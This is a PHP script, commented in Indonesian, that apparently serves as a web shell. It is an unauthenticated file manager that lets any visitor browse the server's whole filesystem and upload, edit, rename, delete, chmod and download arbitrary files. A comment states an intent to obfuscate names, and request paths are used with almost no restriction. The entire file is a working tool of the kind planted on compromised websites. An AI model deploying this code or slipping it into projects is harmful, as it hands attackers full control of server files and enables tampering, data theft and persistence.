<?php
// Obfuscasi nama fungsi dan variabel
$f1 = 'validate_path'; $f2 = 'get_permissions'; $f3 = 'remove_directory'; $f4 = 'show_current_path'; $f5 = 'handle_requests';

// Fungsi untuk memvalidasi jalur agar tetap aman
function validate_path($path) {
    return realpath($path) !== false;
}

// Fungsi untuk menampilkan izin file dalam format octal
function get_permissions($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}

// Fungsi untuk menghapus file atau folder beserta isinya
function remove_directory($dir) {
    if (!is_dir($dir)) return false;
    $files = array_diff(scandir($dir), array('.', '..'));
    foreach ($files as $file) {
        $filePath = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($filePath)) {
            remove_directory($filePath);
        } else {
            unlink($filePath);
        }
    }
    rmdir($dir);
}

// Fungsi untuk menampilkan breadcrumb path
function show_current_path($dir) {
    $parts = explode(DIRECTORY_SEPARATOR, realpath($dir));
    $path = ''; $pwd = '';
    foreach ($parts as $part) {
        $path .= DIRECTORY_SEPARATOR . $part;
        $pwd .= "<a href='?p=" . urlencode($path) . "'>$part</a> / ";
    }
    return rtrim($pwd, ' / ');
}

// Fungsi utama untuk menangani permintaan
function handle_requests() {
    $uploadDir = __DIR__;
    $dir = isset($_GET['p']) ? $_GET['p'] : $uploadDir;

    // Upload file
    if (isset($_FILES['upload'])) {
        $uploadName = basename($_FILES['upload']['name']);
        $uploadTmp = $_FILES['upload']['tmp_name'];
        $targetDir = isset($_POST['targetDir']) ? $_POST['targetDir'] : $dir;
        if (validate_path($targetDir) && is_dir($targetDir)) {
            $uploadPath = realpath($targetDir) . DIRECTORY_SEPARATOR . $uploadName;
            if (move_uploaded_file($uploadTmp, $uploadPath)) {
                echo "<script>alert('File berhasil diupload ke $uploadPath');</script>";
            } else {
                echo "<script>alert('Gagal mengupload file');</script>";
            }
        } else {
            echo "<script>alert('Direktori tujuan tidak valid');</script>";
        }
    }

    // Edit file
    if (isset($_GET['edit']) && is_file($_GET['edit']) && validate_path($_GET['edit'])) {
        $filePath = $_GET['edit'];
        if (isset($_POST['content'])) {
            file_put_contents($filePath, $_POST['content']);
            echo "<script>alert('File berhasil disimpan');</script>";
        }
        echo '<form method="POST">';
        echo '<textarea name="content" style="width:100%;height:300px;">' . htmlspecialchars(file_get_contents($filePath)) . '</textarea>';
        echo '<br><input type="submit" value="Simpan">';
        echo '</form>';
        exit;
    }

    // Hapus file atau folder
    if (isset($_GET['delete']) && validate_path($_GET['delete'])) {
        $deletePath = $_GET['delete'];
        if (is_file($deletePath)) {
            unlink($deletePath);
            echo "<script>alert('File berhasil dihapus');</script>";
        } elseif (is_dir($deletePath)) {
            remove_directory($deletePath);
            echo "<script>alert('Folder beserta isinya berhasil dihapus');</script>";
        }
    }

    // Ganti nama file atau folder
    if (isset($_GET['rename']) && isset($_POST['newName']) && validate_path($_GET['rename'])) {
        $oldPath = $_GET['rename'];
        $newName = $_POST['newName'];
        $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;
        if (rename($oldPath, $newPath)) {
            echo "<script>alert('Nama file atau folder berhasil diubah');</script>";
        } else {
            echo "<script>alert('Gagal mengganti nama file atau folder');</script>";
        }
    }

    // Ubah izin file
    if (isset($_GET['chmod']) && isset($_POST['permissions']) && validate_path($_GET['chmod'])) {
        $filePath = $_GET['chmod'];
        $permissions = $_POST['permissions'];
        if (chmod($filePath, octdec($permissions))) {
            echo "<script>alert('Izin file berhasil diubah');</script>";
        } else {
            echo "<script>alert('Gagal mengubah izin file');</script>";
        }
    }

    // Unduh file
    if (isset($_GET['download']) && is_file($_GET['download']) && validate_path($_GET['download'])) {
        $filePath = $_GET['download'];
        $fileName = basename($filePath);
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $fileName . '"');
        header('Content-Length: ' . filesize($filePath));
        readfile($filePath);
        exit;
    }

    // Buat folder baru
    if (isset($_POST['createFolder'])) {
        $newFolderName = $_POST['folderName'];
        $newFolderPath = realpath($dir) . DIRECTORY_SEPARATOR . $newFolderName;
        if (!is_dir($newFolderPath)) {
            mkdir($newFolderPath);
            echo "<script>alert('Folder berhasil dibuat: $newFolderPath');</script>";
        } else {
            echo "<script>alert('Folder sudah ada');</script>";
        }
    }

    // Tampilkan direktori saat ini
    echo '<h2>Direktori Saat Ini (PWD)</h2>';
    echo '<p>' . show_current_path($dir) . '</p>';

    // Form untuk upload file
    echo '<form method="POST" enctype="multipart/form-data">';
    echo 'Pilih File: <input type="file" name="upload"><br>';
    echo 'Direktori Tujuan: <input type="text" name="targetDir" value="' . htmlspecialchars($dir) . '" style="width: 400px;"><br>';
    echo '<input type="submit" value="Upload">';
    echo '</form>';

    // Form untuk membuat folder baru
    echo '<form method="POST">';
    echo 'Nama Folder Baru: <input type="text" name="folderName"><br>';
    echo '<input type="submit" name="createFolder" value="Buat Folder Baru">';
    echo '</form>';

    // Tampilkan daftar file dan folder
    echo '<ul>';
    if ($dir !== '/') {
        echo '<li><a href="?p=' . urlencode(dirname($dir)) . '">.. (Kembali)</a></li>';
    }
    $files = scandir($dir);
    foreach ($files as $f) {
        if ($f === '.' || $f === '..') continue;
        $path = realpath("$dir/$f");
        if (is_dir($path)) {
            echo "<li>[DIR] <a href='?p=" . urlencode($path) . "'>$f</a> 
                    <a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Yakin ingin menghapus folder ini beserta isinya?\");'>[Hapus]</a>
                    <span>Permissions: " . get_permissions($path) . "</span>
                    <a href='?chmod=" . urlencode($path) . "'>[Change Permissions]</a></li>";
        } else {
            echo "<li>[FILE] <a href='?edit=" . urlencode($path) . "'>$f</a> 
                    <a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Yakin ingin menghapus file ini?\");'>[Hapus]</a> 
                    <a href='?rename=" . urlencode($path) . "'>[Rename]</a>
                    <span>Permissions: " . get_permissions($path) . "</span>
                    <a href='?chmod=" . urlencode($path) . "'>[Change Permissions]</a>
                    <a href='?download=" . urlencode($path) . "'>[Download]</a></li>";
        }
    }
    echo '</ul>';

    // Form untuk rename file atau folder
    if (isset($_GET['rename'])) {
        $renamePath = $_GET['rename'];
        echo '<form method="POST">';
        echo 'Nama Baru: <input type="text" name="newName" value="' . htmlspecialchars(basename($renamePath)) . '">';
        echo '<input type="submit" value="Ubah Nama">';
        echo '</form>';
    }

    // Form untuk mengubah izin file
    if (isset($_GET['chmod'])) {
        $chmodPath = $_GET['chmod'];
        $currentPermissions = get_permissions($chmodPath);
        echo '<form method="POST">';
        echo 'Izin Baru (octal): <input type="text" name="permissions" value="' . htmlspecialchars($currentPermissions) . '">';
        echo '<input type="submit" value="Ubah Izin">';
        echo '</form>';
    }
}

// Jalankan fungsi utama
handle_requests();
?>
